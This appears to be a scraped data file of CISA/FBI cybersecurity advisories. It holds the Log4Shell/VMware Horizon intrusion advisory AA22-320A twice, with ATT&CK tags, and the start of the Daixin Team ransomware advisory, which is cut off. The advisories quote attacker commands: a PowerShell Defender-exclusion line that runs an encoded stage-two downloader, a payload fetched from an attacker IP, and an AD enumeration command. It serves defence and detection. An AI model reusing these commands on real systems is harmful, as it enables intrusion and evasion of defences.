file.zip contained XMRig cryptocurrency mining software and associated configuration files.

WinRing0x64.sys – XMRig Miner driver
wuacltservice.exe – XMRig Miner
config.json – XMRig miner configuration
RuntimeBroker.exe – Associated file. This file can create a local user account [T1136.001] and tests for internet connectivity by pinging 8.8.8.8 [T1016.001]. The exploit payload created a Scheduled Task [T1053.005] that executed RuntimeBroker.exe daily as SYSTEM. Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access. The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task.

See MAR 10387061-1.v1 for additional information, including IOCs, on these four files.
After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount [T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host. Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.]sh server associated with 144.76.136[.]153. The actors downloaded the following tools:

PsExec – a Microsoft signed tool for system administrators.
Mimikatz – a credential theft tool.
Ngrok – a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok[.]io. CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments. Ngrok is known to be used for malicious purposes.[1]

The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account [T1136.002]. Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network. Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files. The threat actors were able to implant Ngrok on multiple hosts to ensure Ngrok’s persistence should they lose access to a machine during a routine reboot. The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok[.]com and korgn.su.lennut[.]com (the prior domain in reverse). It is possible, but was not observed, that the threat actors configured a custom domain, or used other Ngrok tunnel domains, wildcarded here as *.ngrok[.]com, *.ngrok[.]io, ngrok.*.tunnel[.]com, or korgn.*.lennut[.]com.
Once the threat actors established a deep foothold in the network and moved laterally to the domain controller, they executed the following PowerShell command on the Active Directory to obtain a list of all machines attached to the domain [T1018]:
Powershell.exe get-adcomputer -filter * -properties * | select name,operatingsystem,ipv4address &gt;
The threat actors also changed the password for the local administrator account [T1098] on several hosts as a backup should the rogue domain administrator account get detected and terminated. Additionally, the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process [T1003.001] with task manager but this was stopped by additional anti-virus the FCEB organization had installed.
MITRE ATT&CK TACTICS AND TECHNIQUES
See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations. For additional mitigations, see the Mitigations section.

Table 1: Cyber Threat Actors ATT&CK Techniques for Enterprise


Initial Access


Technique Title
ID
Use
Recommendations


Exploit Public-Facing Application
T1190
The actors exploited Log4Shell for initial access to the organization’s VMware Horizon server.

Mitigation/Detection: Use a firewall or web-application firewall and enable logging to prevent and detect potential Log4Shell exploitation attempts [M1050].
Mitigation: Perform regular vulnerability scanning to detect Log4J vulnerabilities and update Log4J software using vendor provided patches [M1016],[M1051].



Execution


Technique Title
ID
Use
Recommendation


Command and Scripting Interpreter: PowerShell
T1059.001

The actors ran PowerShell commands that added an exclusion rule to Windows Defender.
The actors executed PowerShell on the AD to obtain a list of machines on the domain.


Mitigation: Disable or remove PowerShell for non-administrative users [M1042],[M1026] or enable code-signing to execute only signed scripts [M1045].
Mitigation: Employ anti-malware to automatically detect and quarantine malicious scripts [M1049].



Persistence


Technique Title
ID
Use
Recommendations


Account Manipulation
T1098
The actors changed the password for the local administrator account on several hosts.

Mitigation: Use multifactor authentication for user and privileged accounts [M1032].
Detection: Monitor events for changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728, and 4670. Monitor for modification of accounts in correlation with other suspicious activity [DS0002].



Create Account: Local Account
T1136.001
The actors’ malware can create local user accounts.

Mitigation: Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts.
Detection: Monitor executed commands and arguments for actions that are associated with local account creation, such as net user /add , useradd, and dscl -create [DS0017].
Detection: Enable logging for new user creation [DS0002].



Create Account: Domain Account
T1136.002
The actors used Mimikatz to create a rogue domain administrator account.

Mitigation: Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts.
Detection: Enable logging for new user creation, especially domain administrator accounts [DS0002].



Scheduled Task/Job: Scheduled Task
T1053.005
The actors’ exploit payload created Scheduled Task RuntimeBrokerService.exe, which executed RuntimeBroker.exe daily as SYSTEM.

Mitigation: Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM [M1028].
Detection: Monitor for newly constructed processes and/or command-lines that execute from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows [DS0009]
Detection: Monitor for newly constructed scheduled jobs by enabling the Microsoft-Windows-TaskScheduler/Operational setting within the event logging service [DS0003].



Valid Accounts: Default Accounts
T1078.001
The actors used built-in Windows user account DefaultAccount.

Mitigation: Change default usernames and passwords immediately after the installation and before deployment to a production environment [M1027].
Detection: Develop rules to monitor logon behavior across default accounts that have been activated or logged into [DS0028].



Defense Evasion


Technique Title
ID
Use
Recommendations



Impair Defenses: Disable or Modify Tools
           

T1562.001

The actors added an exclusion rule to Windows Defender. The tool allowlisted the entire c:\drive, enabling the actors to bypass virus scans for tools they downloaded to the c:\drive.
The actors manually disabled Windows Defender via the GUI.


Mitigation: Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services. [M1018].
Detection: Monitor for changes made to Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender [DS0024].
Detection: Monitor for telemetry that provides context for modification or deletion of information related to security software processes or services such as Windows Defender definition files in Windows and System log files in Linux [DS0013].
Detection: Monitor processes for unexpected termination related to security tools/services [DS0009].



Indicator Removal on Host: File Deletion
T1070.004
The actors removed malicious file mde.ps1 from the dis.

Detection: Monitor executed commands and arguments for actions that could be utilized to unlink, rename, or delete files [DS0017].
Detection: Monitor for unexpected deletion of files from the system [DS0022].



Credential Access


Technique Title
ID
Use
Recommendations


OS Credential Dumping: LSASS Memory
T1003.001
The actors were observed trying to dump LSASS process.

Mitigation: With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping [M1043]
Mitigation: On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing [M1040].
Mitigation: Ensure that local administrator accounts have complex, unique passwords across all systems on the network [M1027].
Detection: Monitor for unexpected processes interacting with LSASS.exe. Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. [DS0009].
Detection: Monitor executed commands and arguments that may attempt to access credential material stored in the process memory of the LSASS [DS0017].



Credentials from Password Stores
T1555
The actors used Mimikatz to harvest credentials.

Mitigation: Organizations may consider weighing the risk of storing credentials in password stores and web browsers. If system, software, or web browser credential disclosure is a significant concern, technical controls, policy, and user training may be used to prevent storage of credentials in improper locations [M1027].
Detection: Monitor for processes being accessed that may search for common password storage locations to obtain user credentials [DS0009].
Detection: Monitor executed commands and arguments that may search for common password storage locations to obtain user credentials [DS0017].



Discovery


Technique Title
ID
Use
Recommendations


Remote System Discovery
T1018
The actors executed a PowerShell command on the AD to obtain a list of all machines attached to the domain.

Detection: Monitor executed commands and arguments that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement [DS0017].
Detection: Monitor for newly constructed network connections associated with pings/scans that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement [DS0029].
Detection: Monitor for newly executed processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession [DS0009].



System Network Configuration Discovery: Internet Connection Discovery
T1016.001
The actors’ malware tests for internet connectivity by pinging 8.8.8.8.
Mitigation: Monitor executed commands, arguments [DS0017] and executed processes (e.g., tracert or ping) [DS0009] that may check for internet connectivity on compromised systems.


Lateral Movement


Technique Title
ID
Use
Recommendations


Remote Services: Remote Desktop Protocol
T1021.001
The actors used RDP to move laterally to multiple hosts on the network.

Mitigation: Use MFA for remote logins [M1032].
Mitigation: Disable the RDP service if it is unnecessary [M1042].
Mitigation: Do not leave RDP accessible from the internet. Enable firewall rules to block RDP traffic between network security zones within a network [M1030].
Mitigation: Consider removing the local Administrators group from the list of groups allowed to log in through RDP [M1026].
Detection: Monitor for user accounts logged into systems associated with RDP (ex: Windows EID 4624 Logon Type 10). Other factors, such as access patterns (ex: multiple systems over a relatively short period of time) and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP [DS0028].



Command and Control


Technique Title
ID
Use
Recommendations


Proxy
T1090
The actors used Ngrok to proxy RDP connections and to perform command and control.

Mitigation: Traffic to known anonymity networks and C2 infrastructure can be blocked through the use of network allow and block lists [M1037].
Detection: Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g., extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure) [DS0029].



Ingress Tool Transfer
T1105
The actors downloaded malware and multiple tools to the network, including PsExec, Mimikatz, and Ngrok.

Mitigation: Employ anti-malware to automatically detect and quarantine malicious scripts [M1049].
 




 
INCIDENT RESPONSE
If suspected initial access or compromise is detected based on IOCs or TTPs in this CSA, CISA encourages organizations to assume lateral movement by threat actors and investigate connected systems and the DC.
CISA recommends organizations apply the following steps before applying any mitigations, including patching.

Immediately isolate affected systems.
Collect and review relevant logs, data, and artifacts. Take a memory capture of the device(s) and a forensic image capture for detailed analysis.
Consider soliciting support from a third-party incident response organization that can provide subject matter expertise to ensure the actor is eradicated from the network and to avoid residual issues that could enable follow-on exploitation.
Report incidents to CISA via CISA’s 24/7 Operations Center (SayCISA@cisa.dhs.gov or 888-282-0870) or your local FBI field office, or FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. 


Mitigations

CISA and FBI recommend implementing the mitigations below and in Table 1 to improve your organization's cybersecurity posture on the basis of threat actor behaviors.

Install updated builds to ensure affected VMware Horizon and UAG systems are updated to the latest version.

If updates or workarounds were not promptly applied following VMware’s release of updates for Log4Shell in December 2021, treat those VMware Horizon systems as compromised. Follow the pro-active incident response procedures outlined above prior to applying updates. If no compromise is detected, apply these updates as soon as possible.

See VMware Security Advisory VMSA-2021-0028.13 and VMware Knowledge Base (KB) 87073 to determine which VMware Horizon components are vulnerable.
Note: Until the update is fully implemented, consider removing vulnerable components from the internet to limit the scope of traffic. While installing the updates, ensure network perimeter access controls are as restrictive as possible.
If upgrading is not immediately feasible, see KB87073 and KB87092 for vendor-provided temporary workarounds. Implement temporary solutions using an account with administrative privileges. Note that these temporary solutions should not be treated as permanent fixes; vulnerable components should be upgraded to the latest build as soon as possible.
Prior to implementing any temporary solution, ensure appropriate backups have been completed.
Verify successful implementation of mitigations by executing the vendor supplied script Horizon_Windows_Log4j_Mitigations.zip without parameters to ensure that no vulnerabilities remain. See KB87073 for details.




Keep all software up to date and prioritize patching known exploited vulnerabilities (KEVs).
Minimize the internet-facing attack surface by hosting essential services on a segregated DMZ, ensuring strict network perimeter access controls, and not hosting internet-facing services that are not essential to business operations. Where possible, implement regularly updated web application firewalls (WAF) in front of public-facing services. WAFs can protect against web-based exploitation using signatures and heuristics that are likely to block or alert on malicious traffic.
Use best practices for identity and access management (IAM) by implementing phishing resistant multifactor authentication (MFA), enforcing use of strong passwords, regularly auditing administrator accounts and permissions, and limiting user access through the principle of least privilege. Disable inactive accounts uniformly across the AD, MFA systems, etc.

If using Windows 10 version 1607 or Windows Server 2016 or later, monitor or disable Windows DefaultAccount, also known as the Default System Managed Account (DSMA).


Audit domain controllers to log successful Kerberos Ticket Granting Service (TGS) requests and ensure the events are monitored for anomalous activity.  

Secure accounts.
Enforce the principle of least privilege. Administrator accounts should have the minimum permission necessary to complete their tasks.
Ensure there are unique and distinct administrative accounts for each set of administrative tasks.
Create non-privileged accounts for privileged users and ensure they use the non-privileged accounts for all non-privileged access (e.g., web browsing, email access).


Create a deny list of known compromised credentials and prevent users from using known-compromised passwords.
Secure credentials by restricting where accounts and credentials can be used and by using local device credential protection features. 

Use virtualizing solutions on modern hardware and software to ensure credentials are securely stored.
Ensure storage of clear text passwords in LSASS memory is disabled. Note: For Windows 8, this is enabled by default. For more information see Microsoft Security Advisory Update to Improve Credentials Protection and Management.
Consider disabling or limiting NTLM and WDigest Authentication.
Implement Credential Guard for Windows 10 and Server 2016 (refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA).
Minimize the AD attack surface to reduce malicious ticket-granting activity. Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ TGS and can be used to obtain hashed credentials that threat actors attempt to crack. 



VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA and FBI recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see table 1).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.

References

[1] MITRE ATT&CK Version 11: Software – Ngrok

Revisions

Initial Version: November 16, 2022






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1190', 'T1070.004', 'TA0008', 'T1090', 'T1136.001', 'T1562.001', 'T1016.001', 'T1105', 'TA0001', 'T1021.001', 'T1018', 'T1136.002', 'T1053.005', 'T1098', 'T1078.001', 'T1003.001', 'T1059.001', 'T1555'}","




Summary

From mid-June through mid-July 2022, CISA conducted an incident response engagement at a Federal Civilian Executive Branch (FCEB) organization where CISA observed suspected advanced persistent threat (APT) activity. In the course of incident response activities, CISA determined that cyber threat actors exploited the Log4Shell vulnerability in an unpatched VMware Horizon server, installed XMRig crypto mining software, moved laterally to the domain controller (DC), compromised credentials, and then implanted Ngrok reverse proxies on several hosts to maintain persistence. CISA and the Federal Bureau of Investigation (FBI) assess that the FCEB network was compromised by Iranian government-sponsored APT actors.
CISA and FBI are releasing this Cybersecurity Advisory (CSA) providing the suspected Iranian government-sponsored actors’ tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help network defenders detect and protect against related compromises.
CISA and FBI encourage all organizations with affected VMware systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities. If suspected initial access or compromise is detected based on IOCs or TTPs described in this CSA, CISA and FBI encourage organizations to assume lateral movement by threat actors, investigate connected systems (including the DC), and audit privileged accounts. All organizations, regardless of identified evidence of compromise, should apply the recommendations in the Mitigations section of this CSA to protect against similar malicious cyber activity.
For more information on Iranian government-sponsored Iranian malicious cyber activity, see CISA’s Iran Cyber Threat Overview and Advisories webpage and FBI’s Iran Threats webpage.
Download the PDF version of this report: pdf, 528 kb.
For a downloadable copy of the Malware Analysis Report (MAR) accompanying this report, see: MAR 10387061-1.v1.
For a downloadable copy of IOCs, see: AA22-320A.stix, 1.55 mb.

Technical Details

Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 11. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques with corresponding mitigation and/or detection recommendations.
Overview
In April 2022, CISA conducted retrospective analysis using EINSTEIN—an FCEB-wide intrusion detection system (IDS) operated and monitored by CISA—and identified suspected APT activity on an FCEB organization’s network. CISA observed bi-directional traffic between the network and a known malicious IP address associated with exploitation of the Log4Shell vulnerability (CVE-2021-44228) in VMware Horizon servers. In coordination with the FCEB organization, CISA initiated threat hunting incident response activities; however, prior to deploying an incident response team, CISA observed additional suspected APT activity. Specifically, CISA observed HTTPS activity from IP address 51.89.181,.,64 to the organization’s VMware server. Based on trusted third-party reporting, 51.89.181,.,64 is a Lightweight Directory Access Protocol (LDAP) server associated with threat actors exploiting Log4Shell. Following HTTPS activity, CISA observed a suspected LDAP callback on port 443 to this IP address. CISA also observed a DNS query for us‐nation‐ny,.,cf that resolved back to 51.89.181,.,64 when the victim server was returning this Log4Shell LDAP callback to the actors’ server.
CISA assessed that this traffic indicated a confirmed compromise based on the successful callback to the indicator and informed the organization of these findings; the organization investigated the activity and found signs of compromise. As trusted-third party reporting associated Log4Shell activity from 51.89.181,.,64 with lateral movement and targeting of DCs, CISA suspected the threat actors had moved laterally and compromised the organization’s DC.
From mid-June through mid-July 2022, CISA conducted an onsite incident response engagement and determined that the organization was compromised as early as February 2022, by likely Iranian government-sponsored APT actors who installed XMRig crypto mining software. The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies.
Threat Actor Activity
In February 2022, the threat actors exploited Log4Shell, for initial access, to the organization’s unpatched VMware Horizon server. As part of their initial exploitation, CISA observed a connection to known malicious IP address 182.54.217,.,2 lasting 17.6 seconds.
The actors’ exploit payload ran the following PowerShell command, that added an exclusion rule to Windows Defender,:
powershell try{Add-MpPreference -ExclusionPath 'C:\'; Write-Host 'added-exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc ""$BASE64 encoded payload to download next stage and execute it""
The exclusion rule allowlisted the entire c:\drive, enabling threat actors to download tools to the c:\drive without virus scans. The exploit payload then downloaded mdeploy.text from 182.54.217,.,2/mdepoy.txt to C:\users\public\mde.ps1,. When executed, mde.ps1 downloaded file.zip from 182.54.217,.,2 and removed mde.ps1 from the disk,.
file.zip contained XMRig cryptocurrency mining software and associated configuration files.

WinRing0x64.sys – XMRig Miner driver
wuacltservice.exe – XMRig Miner
config.json – XMRig miner configuration
RuntimeBroker.exe – Associated file. This file can create a local user account, and tests for internet connectivity by pinging 8.8.8.8,. The exploit payload created a Scheduled Task, that executed RuntimeBroker.exe daily as SYSTEM. Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access. The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task.

See MAR 10387061-1.v1 for additional information, including IOCs, on these four files.
After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP, and the built-in Windows user account DefaultAccount, to move laterally, to a VMware VDI-KMS host. Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer,.,sh server associated with 144.76.136,.,153. The actors downloaded the following tools:

PsExec – a Microsoft signed tool for system administrators.
Mimikatz – a credential theft tool.
Ngrok – a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok,.,io. CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments. Ngrok is known to be used for malicious purposes.,1,

The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account,. Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network. Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files. The threat actors were able to implant Ngrok on multiple hosts to ensure Ngrok’s persistence should they lose access to a machine during a routine reboot. The actors were able to proxy, RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok,.,com and korgn.su.lennut,.,com (the prior domain in reverse). It is possible, but was not observed, that the threat actors configured a custom domain, or used other Ngrok tunnel domains, wildcarded here as *.ngrok,.,com, *.ngrok,.,io, ngrok.*.tunnel,.,com, or korgn.*.lennut,.,com.
Once the threat actors established a deep foothold in the network and moved laterally to the domain controller, they executed the following PowerShell command on the Active Directory to obtain a list of all machines attached to the domain,:
Powershell.exe get-adcomputer -filter * -properties * | select name,operatingsystem,ipv4address &gt;
The threat actors also changed the password for the local administrator account, on several hosts as a backup should the rogue domain administrator account get detected and terminated. Additionally, the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process, with task manager but this was stopped by additional anti-virus the FCEB organization had installed.
MITRE ATT&CK TACTICS AND TECHNIQUES
See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations. For additional mitigations, see the Mitigations section.

 
INCIDENT RESPONSE
If suspected initial access or compromise is detected based on IOCs or TTPs in this CSA, CISA encourages organizations to assume lateral movement by threat actors and investigate connected systems and the DC.
CISA recommends organizations apply the following steps before applying any mitigations, including patching.

Immediately isolate affected systems.
Collect and review relevant logs, data, and artifacts. Take a memory capture of the device(s) and a forensic image capture for detailed analysis.
Consider soliciting support from a third-party incident response organization that can provide subject matter expertise to ensure the actor is eradicated from the network and to avoid residual issues that could enable follow-on exploitation.
Report incidents to CISA via CISA’s 24/7 Operations Center (SayCISA@cisa.dhs.gov or 888-282-0870) or your local FBI field office, or FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. 


Mitigations

CISA and FBI recommend implementing the mitigations below and in Table 1 to improve your organization's cybersecurity posture on the basis of threat actor behaviors.

Install updated builds to ensure affected VMware Horizon and UAG systems are updated to the latest version.

If updates or workarounds were not promptly applied following VMware’s release of updates for Log4Shell in December 2021, treat those VMware Horizon systems as compromised. Follow the pro-active incident response procedures outlined above prior to applying updates. If no compromise is detected, apply these updates as soon as possible.

See VMware Security Advisory VMSA-2021-0028.13 and VMware Knowledge Base (KB) 87073 to determine which VMware Horizon components are vulnerable.
Note: Until the update is fully implemented, consider removing vulnerable components from the internet to limit the scope of traffic. While installing the updates, ensure network perimeter access controls are as restrictive as possible.
If upgrading is not immediately feasible, see KB87073 and KB87092 for vendor-provided temporary workarounds. Implement temporary solutions using an account with administrative privileges. Note that these temporary solutions should not be treated as permanent fixes; vulnerable components should be upgraded to the latest build as soon as possible.
Prior to implementing any temporary solution, ensure appropriate backups have been completed.
Verify successful implementation of mitigations by executing the vendor supplied script Horizon_Windows_Log4j_Mitigations.zip without parameters to ensure that no vulnerabilities remain. See KB87073 for details.




Keep all software up to date and prioritize patching known exploited vulnerabilities (KEVs).
Minimize the internet-facing attack surface by hosting essential services on a segregated DMZ, ensuring strict network perimeter access controls, and not hosting internet-facing services that are not essential to business operations. Where possible, implement regularly updated web application firewalls (WAF) in front of public-facing services. WAFs can protect against web-based exploitation using signatures and heuristics that are likely to block or alert on malicious traffic.
Use best practices for identity and access management (IAM) by implementing phishing resistant multifactor authentication (MFA), enforcing use of strong passwords, regularly auditing administrator accounts and permissions, and limiting user access through the principle of least privilege. Disable inactive accounts uniformly across the AD, MFA systems, etc.

If using Windows 10 version 1607 or Windows Server 2016 or later, monitor or disable Windows DefaultAccount, also known as the Default System Managed Account (DSMA).


Audit domain controllers to log successful Kerberos Ticket Granting Service (TGS) requests and ensure the events are monitored for anomalous activity.  

Secure accounts.
Enforce the principle of least privilege. Administrator accounts should have the minimum permission necessary to complete their tasks.
Ensure there are unique and distinct administrative accounts for each set of administrative tasks.
Create non-privileged accounts for privileged users and ensure they use the non-privileged accounts for all non-privileged access (e.g., web browsing, email access).


Create a deny list of known compromised credentials and prevent users from using known-compromised passwords.
Secure credentials by restricting where accounts and credentials can be used and by using local device credential protection features. 

Use virtualizing solutions on modern hardware and software to ensure credentials are securely stored.
Ensure storage of clear text passwords in LSASS memory is disabled. Note: For Windows 8, this is enabled by default. For more information see Microsoft Security Advisory Update to Improve Credentials Protection and Management.
Consider disabling or limiting NTLM and WDigest Authentication.
Implement Credential Guard for Windows 10 and Server 2016 (refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA).
Minimize the AD attack surface to reduce malicious ticket-granting activity. Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ TGS and can be used to obtain hashed credentials that threat actors attempt to crack. 



VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA and FBI recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see table 1).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.

References,1, MITRE ATT&CK Version 11: Software – Ngrok

Revisions

Initial Version: November 16, 2022






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a
38,"




Summary

Actions to take today to mitigate cyber threats from ransomware:

Install updates for operating systems, software, and firmware as soon as they are released.
Require phishing-resistant MFA for as many services as possible.
Train users to recognize and report phishing attempts.

Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and Department of Health and Human Services (HHS) are releasing this joint CSA to provide information on the “Daixin Team,” a cybercrime group that is actively targeting U.S. businesses, predominantly in the Healthcare and Public Health (HPH) Sector, with ransomware and data extortion operations.
This joint CSA provides TTPs and IOCs of Daixin actors obtained from FBI threat response activities and third-party reporting.
Download the PDF version of this report:


Stopransomware Daixin Team
(PDF,       560.58 KB
  )


Download the IOCs: 


AA22-294A STIX
(XML,       23.22 KB
  )


Technical Details
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 11. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
Cybercrime actors routinely target HPH Sector organizations with ransomware:

As of October 2022, per FBI Internet Crime Complaint Center (IC3) data, specifically victim reports across all 16 critical infrastructure sectors, the HPH Sector accounts for 25 percent of ransomware complaints.
According to an IC3 annual report in 2021, 649 ransomware reports were made across 14 critical infrastructure sectors; the HPH Sector accounted for the most reports at 148.

The Daixin Team is a ransomware and data extortion group that has targeted the HPH Sector with ransomware and data extortion operations since at least June 2022. Since then, Daixin Team cybercrime actors have caused ransomware incidents at multiple HPH Sector organizations where they have:

Deployed ransomware to encrypt servers responsible for healthcare services—including electronic health records services, diagnostics services, imaging services, and intranet services, and/or
Exfiltrated personal identifiable information (PII) and patient health information (PHI) and threatened to release the information if a ransom is not paid.

Daixin actors gain initial access to victims through virtual private network (VPN) servers. In one confirmed compromise, the actors likely exploited an unpatched vulnerability in the organization’s VPN server [T1190]. In another confirmed compromise, the actors used previously compromised credentials to access a legacy VPN server [T1078] that did not have multifactor authentication (MFA) enabled. The actors are believed to have acquired the VPN credentials through the use of a phishing email with a malicious attachment [T1598.002].
After obtaining access to the victim’s VPN server, Daixin actors move laterally via Secure Shell (SSH) [T1563.001] and Remote Desktop Protocol (RDP) [T1563.002]. Daixin actors have sought to gain privileged account access through credential dumping [T1003] and pass the hash [T1550.002]. The actors have leveraged privileged accounts to gain access to VMware vCenter Server and reset account passwords [T1098] for ESXi servers in the environment. The actors have then used SSH to connect to accessible ESXi servers and deploy ransomware [T1486] on those servers. 
According to third-party reporting, the Daixin Team’s ransomware is based on leaked Babuk Locker source code. This third-party reporting as well as FBI analysis show that the ransomware targets ESXi servers and encrypts files located in /vmfs/volumes/ with the following extensions: .vmdk, .vmem, .vswp, .vmsd, .vmx, and .vmsn. A ransom note is also written to /vmfs/volumes/. See Figure 1 for targeted file system path and Figure 2 for targeted file extensions list. Figure 3 and Figure 4 include examples of ransom notes. Note that in the Figure 3 ransom note, Daixin actors misspell “Daixin” as “Daxin.”

Figure 1: Daixin Team – Ransomware Targeted File Path

Figure 2: Daixin Team – Ransomware Targeted File Extensions

Figure 3: Example 1 of Daixin Team Ransomware Note

Figure 4: Example 2 of Daixin Team Ransomware Note
In addition to deploying ransomware, Daixin actors have exfiltrated data [TA0010] from victim systems. In one confirmed compromise, the actors used Rclone—an open-source program to manage files on cloud storage—to exfiltrate data to a dedicated virtual private server (VPS). In another compromise, the actors used Ngrok—a reverse proxy tool for proxying an internal service out onto an Ngrok domain—for data exfiltration [T1567].
MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 1 for all referenced threat actor tactics and techniques included in this advisory.
Table 1: Daixin Actors’ ATT&CK Techniques for Enterprise




Reconnaissance




Technique Title


ID


Use




Phishing for Information: Spearphishing Attachment


T1598.002


Daixin actors have acquired the VPN credentials (later used for initial access) by a phishing email with a malicious attachment.




Initial Access




Technique Title


ID


Use




Exploit Public-Facing Application


T1190


Daixin actors exploited an unpatched vulnerability in a VPN server to gain initial access to a network.




Valid Accounts


T1078


Daixin actors use previously compromised credentials to access servers on the target network.




Persistence




Technique Title


ID


Use




Account Manipulation


T1098


Daixin actors have leveraged privileged accounts to reset account passwords for VMware ESXi servers in the compromised environment.




Credential Access




Technique Title


ID


Use




OS Credential Dumping


T1003


Daixin actors have sought to gain privileged account access through credential dumping.




Lateral Movement




Technique Title


ID


Use




Remote Service Session Hijacking: SSH Hijacking


T1563.001


Daixin actors use SSH and RDP to move laterally across a network.




Remote Service Session Hijacking: RDP Hijacking


T1563.002


Daixin actors use RDP to move laterally across a network.




Use Alternate Authentication Material: Pass the Hash


T1550.002


Daixin actors have sought to gain privileged account access through pass the hash.




Exfiltration




Technique Title


ID


Use




Exfiltration Over Web Service


T1567


Daixin Team members have used Ngrok for data exfiltration over web servers.




Impact




Technique Title


ID


Use




